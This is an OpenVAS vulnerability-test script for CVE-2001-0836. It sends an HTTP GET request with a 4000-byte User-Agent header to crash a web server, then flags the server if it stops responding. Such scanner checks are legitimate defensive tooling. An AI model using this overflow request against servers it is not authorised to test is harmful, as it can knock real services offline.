# OpenVAS Vulnerability Test
# $Id: www_too_long_useragent.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: HTTP User-Agent overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CVE
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the web server by
sending an invalid GET request with a too long User-Agent field

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11069");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3443, 3449, 7054);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2001-0836");
 name = "HTTP User-Agent overflow";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before OpenVAS 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl", "httpver.nasl", "http_version.nasl");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if(http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

# NB: Need at least 4000 bytes to crash Oracle Web
# r = string("GET / HTTP/1.0\r\nUser-Agent: ", crap(4000), "\r\n\r\n");
# Nice trick from Renaud to handle HTTP/1.1 requests:
r= http_get(item:"/", port:port);
ua = egrep(pattern:"^User-Agent:", string:r);
if(ua)
 {
  r = r - ua;
 }
 
r= r - string("\r\n\r\n");
r= string(r, "\r\n", "User-Agent: ", crap(4000), "\r\n\r\n");
send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);


if (http_is_dead(port: port)) { security_message(port);}
